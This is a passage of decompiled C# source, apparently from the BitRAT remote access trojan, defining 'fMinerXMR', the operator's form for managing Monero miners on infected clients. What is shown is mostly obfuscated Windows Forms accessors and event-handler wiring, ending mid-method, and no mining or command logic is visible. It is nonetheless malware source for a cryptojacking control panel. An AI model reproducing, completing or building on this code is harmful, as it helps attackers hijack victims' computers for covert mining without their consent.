﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x0200011B RID: 283
[DesignerGenerated]
public sealed partial class fMinerXMR : Form
{
	// Token: 0x06000F92 RID: 3986 RVA: 0x00073DD8 File Offset: 0x00071FD8
	public fMinerXMR()
	{
		base.Load += this.fMinerXMR_Load;
		base.Closing += this.fMinerXMR_Closing;
		this.concurrentStack_0 = new ConcurrentStack<cMinerXMRcli>();
		this.concurrentStack_1 = new ConcurrentStack<cMinerXMRcli>();
		this.concurrentStack_2 = new ConcurrentStack<cMinerXMRcli>();
		this.InitializeComponent();
	}

	// Token: 0x06000F95 RID: 3989 RVA: 0x000093CE File Offset: 0x000075CE
	internal StatusStrip vmethod_0()
	{
		return this.statusStrip_0;
	}

	// Token: 0x06000F96 RID: 3990 RVA: 0x000093D6 File Offset: 0x000075D6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x06000F97 RID: 3991 RVA: 0x000093DF File Offset: 0x000075DF
	internal ToolStripStatusLabel vmethod_2()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x06000F98 RID: 3992 RVA: 0x000093E7 File Offset: 0x000075E7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(ToolStripStatusLabel toolStripStatusLabel_3)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_3;
	}

	// Token: 0x06000F99 RID: 3993 RVA: 0x000093F0 File Offset: 0x000075F0
	internal ToolStripStatusLabel vmethod_4()
	{
		return this.toolStripStatusLabel_1;
	}

	// Token: 0x06000F9A RID: 3994 RVA: 0x000093F8 File Offset: 0x000075F8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(ToolStripStatusLabel toolStripStatusLabel_3)
	{
		this.toolStripStatusLabel_1 = toolStripStatusLabel_3;
	}

	// Token: 0x06000F9B RID: 3995 RVA: 0x00009401 File Offset: 0x00007601
	internal OLVColumn vmethod_6()
	{
		return this.olvcolumn_0;
	}

	// Token: 0x06000F9C RID: 3996 RVA: 0x00009409 File Offset: 0x00007609
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_0 = olvcolumn_10;
	}

	// Token: 0x06000F9D RID: 3997 RVA: 0x00009412 File Offset: 0x00007612
	internal OLVColumn vmethod_8()
	{
		return this.olvcolumn_1;
	}

	// Token: 0x06000F9E RID: 3998 RVA: 0x0000941A File Offset: 0x0000761A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_1 = olvcolumn_10;
	}

	// Token: 0x06000F9F RID: 3999 RVA: 0x00009423 File Offset: 0x00007623
	internal OLVColumn vmethod_10()
	{
		return this.olvcolumn_2;
	}

	// Token: 0x06000FA0 RID: 4000 RVA: 0x0000942B File Offset: 0x0000762B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_2 = olvcolumn_10;
	}

	// Token: 0x06000FA1 RID: 4001 RVA: 0x00009434 File Offset: 0x00007634
	internal OLVColumn vmethod_12()
	{
		return this.olvcolumn_3;
	}

	// Token: 0x06000FA2 RID: 4002 RVA: 0x0000943C File Offset: 0x0000763C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_3 = olvcolumn_10;
	}

	// Token: 0x06000FA3 RID: 4003 RVA: 0x00009445 File Offset: 0x00007645
	internal OLVColumn vmethod_14()
	{
		return this.olvcolumn_4;
	}

	// Token: 0x06000FA4 RID: 4004 RVA: 0x0000944D File Offset: 0x0000764D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_4 = olvcolumn_10;
	}

	// Token: 0x06000FA5 RID: 4005 RVA: 0x00009456 File Offset: 0x00007656
	internal OLVColumn vmethod_16()
	{
		return this.olvcolumn_5;
	}

	// Token: 0x06000FA6 RID: 4006 RVA: 0x0000945E File Offset: 0x0000765E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_5 = olvcolumn_10;
	}

	// Token: 0x06000FA7 RID: 4007 RVA: 0x00009467 File Offset: 0x00007667
	internal OLVColumn vmethod_18()
	{
		return this.olvcolumn_6;
	}

	// Token: 0x06000FA8 RID: 4008 RVA: 0x0000946F File Offset: 0x0000766F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_6 = olvcolumn_10;
	}

	// Token: 0x06000FA9 RID: 4009 RVA: 0x00009478 File Offset: 0x00007678
	internal OLVColumn vmethod_20()
	{
		return this.olvcolumn_7;
	}

	// Token: 0x06000FAA RID: 4010 RVA: 0x00009480 File Offset: 0x00007680
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_7 = olvcolumn_10;
	}

	// Token: 0x06000FAB RID: 4011 RVA: 0x00009489 File Offset: 0x00007689
	internal FastObjectListView vmethod_22()
	{
		return this.fastObjectListView_0;
	}

	// Token: 0x06000FAC RID: 4012 RVA: 0x000763E0 File Offset: 0x000745E0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(FastObjectListView fastObjectListView_1)
	{
		EventHandler<FormatRowEventArgs> eventHandler = new EventHandler<FormatRowEventArgs>(this.method_9);
		MouseEventHandler value = new MouseEventHandler(this.method_17);
		KeyEventHandler value2 = new KeyEventHandler(this.method_21);
		FastObjectListView fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.FormatRow -= eventHandler;
			fastObjectListView.MouseUp -= value;
			fastObjectListView.KeyDown -= value2;
		}
		this.fastObjectListView_0 = fastObjectListView_1;
		fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.FormatRow += eventHandler;
			fastObjectListView.MouseUp += value;
			fastObjectListView.KeyDown += value2;
		}
	}

	// Token: 0x06000FAD RID: 4013 RVA: 0x00009491 File Offset: 0x00007691
	internal ToolStripStatusLabel vmethod_24()
	{
		return this.toolStripStatusLabel_2;
	}

	// Token: 0x06000FAE RID: 4014 RVA: 0x00009499 File Offset: 0x00007699
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(ToolStripStatusLabel toolStripStatusLabel_3)
	{
		this.toolStripStatusLabel_2 = toolStripStatusLabel_3;
	}

	// Token: 0x06000FAF RID: 4015 RVA: 0x000094A2 File Offset: 0x000076A2
	internal System.Windows.Forms.Timer vmethod_26()
	{
		return this.timer_0;
	}

	// Token: 0x06000FB0 RID: 4016 RVA: 0x0007645C File Offset: 0x0007465C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(System.Windows.Forms.Timer timer_1)
	{
		EventHandler value = new EventHandler(this.method_3);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_1;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000FB1 RID: 4017 RVA: 0x000094AA File Offset: 0x000076AA
	internal RadioButton vmethod_28()
	{
		return this.radioButton_0;
	}

	// Token: 0x06000FB2 RID: 4018 RVA: 0x000094B2 File Offset: 0x000076B2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(RadioButton radioButton_2)
	{
		this.radioButton_0 = radioButton_2;
	}

	// Token: 0x06000FB3 RID: 4019 RVA: 0x000094BB File Offset: 0x000076BB
	internal RadioButton vmethod_30()
	{
		return this.radioButton_1;
	}

	// Token: 0x06000FB4 RID: 4020 RVA: 0x000094C3 File Offset: 0x000076C3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(RadioButton radioButton_2)
	{
		this.radioButton_1 = radioButton_2;
	}

	// Token: 0x06000FB5 RID: 4021 RVA: 0x000094CC File Offset: 0x000076CC
	internal Label vmethod_32()
	{
		return this.label_0;
	}

	// Token: 0x06000FB6 RID: 4022 RVA: 0x000094D4 File Offset: 0x000076D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(Label label_9)
	{
		this.label_0 = label_9;
	}

	// Token: 0x06000FB7 RID: 4023 RVA: 0x000094DD File Offset: 0x000076DD
	internal TextBox vmethod_34()
	{
		return this.textBox_0;
	}

	// Token: 0x06000FB8 RID: 4024 RVA: 0x000764A0 File Offset: 0x000746A0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(TextBox textBox_5)
	{
		EventHandler value = new EventHandler(this.method_5);
		EventHandler value2 = new EventHandler(this.method_6);
		EventHandler value3 = new EventHandler(this.method_32);
		TextBox textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.GotFocus -= value;
			textBox.LostFocus -= value2;
			textBox.TextChanged -= value3;
		}
		this.textBox_0 = textBox_5;
		textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.GotFocus += value;
			textBox.LostFocus += value2;
			textBox.TextChanged += value3;
		}
	}

	// Token: 0x06000FB9 RID: 4025 RVA: 0x000094E5 File Offset: 0x000076E5
	internal TextBox vmethod_36()
	{
		return this.textBox_1;
	}

	// Token: 0x06000FBA RID: 4026 RVA: 0x0007651C File Offset: 0x0007471C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(TextBox textBox_5)
	{
		EventHandler value = new EventHandler(this.method_33);
		EventHandler value2 = new EventHandler(this.method_37);
		EventHandler value3 = new EventHandler(this.method_38);
		TextBox textBox = this.textBox_1;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
			textBox.GotFocus -= value2;
			textBox.LostFocus -= value3;
		}
		this.textBox_1 = textBox_5;
		textBox = this.textBox_1;
		if (textBox != null)
		{
			textBox.TextChanged += value;
			textBox.GotFocus += value2;
			textBox.LostFocus += value3;
		}
	}

	// Token: 0x06000FBB RID: 4027 RVA: 0x000094ED File Offset: 0x000076ED
	internal Label vmethod_38()
	{
		return this.label_1;
	}

	// Token: 0x06000FBC RID: 4028 RVA: 0x000094F5 File Offset: 0x000076F5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(Label label_9)
	{
		this.label_1 = label_9;
	}

	// Token: 0x06000FBD RID: 4029 RVA: 0x000094FE File Offset: 0x000076FE
	internal Label vmethod_40()
	{
		return this.label_2;
	}

	// Token: 0x06000FBE RID: 4030 RVA: 0x00009506 File Offset: 0x00007706
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(Label label_9)
	{
		this.label_2 = label_9;
	}

	// Token: 0x06000FBF RID: 4031 RVA: 0x0000950F File Offset: 0x0000770F
	internal ComboBox vmethod_42()
	{
		return this.comboBox_0;
	}

	// Token: 0x06000FC0 RID: 4032 RVA: 0x00009517 File Offset: 0x00007717
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(ComboBox comboBox_4)
	{
		this.comboBox_0 = comboBox_4;
	}

	// Token: 0x06000FC1 RID: 4033 RVA: 0x00009520 File Offset: 0x00007720
	internal ComboBox vmethod_44()
	{
		return this.comboBox_1;
	}

	// Token: 0x06000FC2 RID: 4034 RVA: 0x00009528 File Offset: 0x00007728
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(ComboBox comboBox_4)
	{
		this.comboBox_1 = comboBox_4;
	}

	// Token: 0x06000FC3 RID: 4035 RVA: 0x00009531 File Offset: 0x00007731
	internal Label vmethod_46()
	{
		return this.label_3;
	}

	// Token: 0x06000FC4 RID: 4036 RVA: 0x00009539 File Offset: 0x00007739
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(Label label_9)
	{
		this.label_3 = label_9;
	}

	// Token: 0x06000FC5 RID: 4037 RVA: 0x00009542 File Offset: 0x00007742
	internal OLVColumn vmethod_48()
	{
		return this.olvcolumn_8;
	}

	// Token: 0x06000FC6 RID: 4038 RVA: 0x0000954A File Offset: 0x0000774A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_8 = olvcolumn_10;
	}

	// Token: 0x06000FC7 RID: 4039 RVA: 0x00009553 File Offset: 0x00007753
	internal CheckBox vmethod_50()
	{
		return this.checkBox_0;
	}

	// Token: 0x06000FC8 RID: 4040 RVA: 0x0000955B File Offset: 0x0000775B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(CheckBox checkBox_4)
	{
		this.checkBox_0 = checkBox_4;
	}

	// Token: 0x06000FC9 RID: 4041 RVA: 0x00009564 File Offset: 0x00007764
	internal TextBox vmethod_52()
	{
		return this.textBox_2;
	}

	// Token: 0x06000FCA RID: 4042 RVA: 0x00076598 File Offset: 0x00074798
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(TextBox textBox_5)
	{
		EventHandler value = new EventHandler(this.method_7);
		EventHandler value2 = new EventHandler(this.method_8);
		EventHandler value3 = new EventHandler(this.method_34);
		TextBox textBox = this.textBox_2;
		if (textBox != null)
		{
			textBox.LostFocus -= value;
			textBox.GotFocus -= value2;
			textBox.TextChanged -= value3;
		}
		this.textBox_2 = textBox_5;
		textBox = this.textBox_2;
		if (textBox != null)
		{
			textBox.LostFocus += value;
			textBox.GotFocus += value2;
			textBox.TextChanged += value3;
		}
	}

	// Token: 0x06000FCB RID: 4043 RVA: 0x0000956C File Offset: 0x0000776C
	internal Label vmethod_54()
	{
		return this.label_4;
	}

	// Token: 0x06000FCC RID: 4044 RVA: 0x00009574 File Offset: 0x00007774
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(Label label_9)
	{
		this.label_4 = label_9;
	}

	// Token: 0x06000FCD RID: 4045 RVA: 0x0000957D File Offset: 0x0000777D
	internal ComboBox vmethod_56()
	{
		return this.comboBox_2;
	}

	// Token: 0x06000FCE RID: 4046 RVA: 0x00009585 File Offset: 0x00007785
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(ComboBox comboBox_4)
	{
		this.comboBox_2 = comboBox_4;
	}

	// Token: 0x06000FCF RID: 4047 RVA: 0x0000958E File Offset: 0x0000778E
	internal Label vmethod_58()
	{
		return this.label_5;
	}

	// Token: 0x06000FD0 RID: 4048 RVA: 0x00009596 File Offset: 0x00007796
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(Label label_9)
	{
		this.label_5 = label_9;
	}

	// Token: 0x06000FD1 RID: 4049 RVA: 0x0000959F File Offset: 0x0000779F
	internal CheckBox vmethod_60()
	{
		return this.checkBox_1;
	}

	// Token: 0x06000FD2 RID: 4050 RVA: 0x000095A7 File Offset: 0x000077A7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(CheckBox checkBox_4)
	{
		this.checkBox_1 = checkBox_4;
	}

	// Token: 0x06000FD3 RID: 4051 RVA: 0x000095B0 File Offset: 0x000077B0
	internal ComboBox vmethod_62()
	{
		return this.comboBox_3;
	}

	// Token: 0x06000FD4 RID: 4052 RVA: 0x000095B8 File Offset: 0x000077B8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(ComboBox comboBox_4)
	{
		this.comboBox_3 = comboBox_4;
	}

	// Token: 0x06000FD5 RID: 4053 RVA: 0x000095C1 File Offset: 0x000077C1
	internal Label vmethod_64()
	{
		return this.label_6;
	}

	// Token: 0x06000FD6 RID: 4054 RVA: 0x000095C9 File Offset: 0x000077C9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_65(Label label_9)
	{
		this.label_6 = label_9;
	}

	// Token: 0x06000FD7 RID: 4055 RVA: 0x000095D2 File Offset: 0x000077D2
	internal TextBox vmethod_66()
	{
		return this.textBox_3;
	}

	// Token: 0x06000FD8 RID: 4056 RVA: 0x00076614 File Offset: 0x00074814
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_67(TextBox textBox_5)
	{
		EventHandler value = new EventHandler(this.method_10);
		EventHandler value2 = new EventHandler(this.method_11);
		EventHandler value3 = new EventHandler(this.method_36);
		TextBox textBox = this.textBox_3;
		if (textBox != null)
		{
			textBox.GotFocus -= value;
			textBox.LostFocus -= value2;
			textBox.TextChanged -= value3;
		}
		this.textBox_3 = textBox_5;
		textBox = this.textBox_3;
		if (textBox != null)
		{
			textBox.GotFocus += value;
			textBox.LostFocus += value2;
			textBox.TextChanged += value3;
		}
	}

	// Token: 0x06000FD9 RID: 4057 RVA: 0x000095DA File Offset: 0x000077DA
	internal Label vmethod_68()
	{
		return this.label_7;
	}

	// Token: 0x06000FDA RID: 4058 RVA: 0x000095E2 File Offset: 0x000077E2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_69(Label label_9)
	{
		this.label_7 = label_9;
	}

	// Token: 0x06000FDB RID: 4059 RVA: 0x000095EB File Offset: 0x000077EB
	internal CheckBox vmethod_70()
	{
		return this.checkBox_2;
	}

	// Token: 0x06000FDC RID: 4060 RVA: 0x000095F3 File Offset: 0x000077F3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_71(CheckBox checkBox_4)
	{
		this.checkBox_2 = checkBox_4;
	}

	// Token: 0x06000FDD RID: 4061 RVA: 0x000095FC File Offset: 0x000077FC
	internal TextBox vmethod_72()
	{
		return this.textBox_4;
	}

	// Token: 0x06000FDE RID: 4062 RVA: 0x00076690 File Offset: 0x00074890
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_73(TextBox textBox_5)
	{
		EventHandler value = new EventHandler(this.method_12);
		EventHandler value2 = new EventHandler(this.method_13);
		EventHandler value3 = new EventHandler(this.method_35);
		TextBox textBox = this.textBox_4;
		if (textBox != null)
		{
			textBox.LostFocus -= value;
			textBox.GotFocus -= value2;
			textBox.TextChanged -= value3;
		}
		this.textBox_4 = textBox_5;
		textBox = this.textBox_4;
		if (textBox != null)
		{
			textBox.LostFocus += value;
			textBox.GotFocus += value2;
			textBox.TextChanged += value3;
		}
	}

	// Token: 0x06000FDF RID: 4063 RVA: 0x00009604 File Offset: 0x00007804
	internal Label vmethod_74()
	{
		return this.label_8;
	}

	// Token: 0x06000FE0 RID: 4064 RVA: 0x0000960C File Offset: 0x0000780C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_75(Label label_9)
	{
		this.label_8 = label_9;
	}

	// Token: 0x06000FE1 RID: 4065 RVA: 0x00009615 File Offset: 0x00007815
	internal OLVColumn vmethod_76()
	{
		return this.olvcolumn_9;
	}

	// Token: 0x06000FE2 RID: 4066 RVA: 0x0000961D File Offset: 0x0000781D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_77(OLVColumn olvcolumn_10)
	{
		this.olvcolumn_9 = olvcolumn_10;
	}

	// Token: 0x06000FE3 RID: 4067 RVA: 0x00009626 File Offset: 0x00007826
	internal ContextMenuStrip vmethod_78()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x06000FE4 RID: 4068 RVA: 0x0000962E File Offset: 0x0000782E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_79(ContextMenuStrip contextMenuStrip_1)
	{
		this.contextMenuStrip_0 = contextMenuStrip_1;
	}

	// Token: 0x06000FE5 RID: 4069 RVA: 0x00009637 File Offset: 0x00007837
	internal ToolStripMenuItem vmethod_80()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x06000FE6 RID: 4070 RVA: 0x0000963F File Offset: 0x0000783F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_81(ToolStripMenuItem toolStripMenuItem_8)
	{
		this.toolStripMenuItem_0 = toolStripMenuItem_8;
	}

	// Token: 0x06000FE7 RID: 4071 RVA: 0x00009648 File Offset: 0x00007848
	internal ToolStripMenuItem vmethod_82()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x06000FE8 RID: 4072 RVA: 0x0007670C File Offset: 0x0007490C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_83(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_16);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_1 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000FE9 RID: 4073 RVA: 0x00009650 File Offset: 0x00007850
	internal ToolStripSeparator vmethod_84()
	{
		return this.toolStripSeparator_0;
	}

	// Token: 0x06000FEA RID: 4074 RVA: 0x00009658 File Offset: 0x00007858
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_85(ToolStripSeparator toolStripSeparator_4)
	{
		this.toolStripSeparator_0 = toolStripSeparator_4;
	}

	// Token: 0x06000FEB RID: 4075 RVA: 0x00009661 File Offset: 0x00007861
	internal ToolStripMenuItem vmethod_86()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x06000FEC RID: 4076 RVA: 0x00076750 File Offset: 0x00074950
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_87(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_14);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_2 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000FED RID: 4077 RVA: 0x00009669 File Offset: 0x00007869
	internal ToolStripSeparator vmethod_88()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x06000FEE RID: 4078 RVA: 0x00009671 File Offset: 0x00007871
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_89(ToolStripSeparator toolStripSeparator_4)
	{
		this.toolStripSeparator_1 = toolStripSeparator_4;
	}

	// Token: 0x06000FEF RID: 4079 RVA: 0x0000967A File Offset: 0x0000787A
	internal ToolStripMenuItem vmethod_90()
	{
		return this.toolStripMenuItem_3;
	}

	// Token: 0x06000FF0 RID: 4080 RVA: 0x00009682 File Offset: 0x00007882
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_91(ToolStripMenuItem toolStripMenuItem_8)
	{
		this.toolStripMenuItem_3 = toolStripMenuItem_8;
	}

	// Token: 0x06000FF1 RID: 4081 RVA: 0x0000968B File Offset: 0x0000788B
	internal ToolStripMenuItem vmethod_92()
	{
		return this.toolStripMenuItem_4;
	}

	// Token: 0x06000FF2 RID: 4082 RVA: 0x00076794 File Offset: 0x00074994
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_93(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_20);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_4 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000FF3 RID: 4083 RVA: 0x00009693 File Offset: 0x00007893
	internal ToolStripSeparator vmethod_94()
	{
		return this.toolStripSeparator_2;
	}

	// Token: 0x06000FF4 RID: 4084 RVA: 0x0000969B File Offset: 0x0000789B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_95(ToolStripSeparator toolStripSeparator_4)
	{
		this.toolStripSeparator_2 = toolStripSeparator_4;
	}

	// Token: 0x06000FF5 RID: 4085 RVA: 0x000096A4 File Offset: 0x000078A4
	internal ToolStripMenuItem vmethod_96()
	{
		return this.toolStripMenuItem_5;
	}

	// Token: 0x06000FF6 RID: 4086 RVA: 0x000096AC File Offset: 0x000078AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_97(ToolStripMenuItem toolStripMenuItem_8)
	{
		this.toolStripMenuItem_5 = toolStripMenuItem_8;
	}

	// Token: 0x06000FF7 RID: 4087 RVA: 0x000096B5 File Offset: 0x000078B5
	internal ToolStripMenuItem vmethod_98()
	{
		return this.toolStripMenuItem_6;
	}

	// Token: 0x06000FF8 RID: 4088 RVA: 0x000767D8 File Offset: 0x000749D8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_99(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_22);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_6;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_6 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_6;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000FF9 RID: 4089 RVA: 0x000096BD File Offset: 0x000078BD
	internal ToolStripSeparator vmethod_100()
	{
		return this.toolStripSeparator_3;
	}

	// Token: 0x06000FFA RID: 4090 RVA: 0x000096C5 File Offset: 0x000078C5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_101(ToolStripSeparator toolStripSeparator_4)
	{
		this.toolStripSeparator_3 = toolStripSeparator_4;
	}

	// Token: 0x06000FFB RID: 4091 RVA: 0x000096CE File Offset: 0x000078CE
	internal ToolStripMenuItem vmethod_102()
	{
		return this.toolStripMenuItem_7;
	}

	// Token: 0x06000FFC RID: 4092 RVA: 0x0007681C File Offset: 0x00074A1C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_103(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_23);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_7 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000FFD RID: 4093 RVA: 0x000096D6 File Offset: 0x000078D6
	internal CheckBox vmethod_104()
	{
		return this.checkBox_3;
	}

	// Token: 0x06000FFE RID: 4094 RVA: 0x000096DE File Offset: 0x000078DE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_105(CheckBox checkBox_4)
	{
		this.checkBox_3 = checkBox_4;
	}

	// Token: 0x06000FFF RID: 4095 RVA: 0x000096E7 File Offset: 0x000078E7
	internal PictureBox vmethod_106()
	{
		return this.pictureBox_0;
	}

	// Token: 0x06001000 RID: 4096 RVA: 0x00076860 File Offset: 0x00074A60
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_107(PictureBox pictureBox_2)
	{
		EventHandler value = new EventHandler(this.method_24);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_0 = pictureBox_2;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06001001 RID: 4097 RVA: 0x000096EF File Offset: 0x000078EF
	internal BackgroundWorker vmethod_108()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x06001002 RID: 4098 RVA: 0x000768A4 File Offset: 0x00074AA4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_109(BackgroundWorker backgroundWorker_1)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_28);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_1;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06001003 RID: 4099 RVA: 0x000096F7 File Offset: 0x000078F7
	internal VisualButton vmethod_110()
	{
		return this.visualButton_0;
	}

	// Token: 0x06001004 RID: 4100 RVA: 0x000768E8 File Offset: 0x00074AE8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_111(VisualButton visualButton_2)
	{
		EventHandler value = new EventHandler(this.method_30);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_2;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06001005 RID: 4101 RVA: 0x000096FF File Offset: 0x000078FF
	internal VisualButton vmethod_112()
	{
		return this.visualButton_1;
	}

	// Token: 0x06001006 RID: 4102 RVA: 0x0007692C File Offset: 0x00074B2C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_113(VisualButton visualButton_2)
	{
		EventHandler value = new EventHandler(this.method_29);
		VisualButton visualButton = this.visualButton_1;
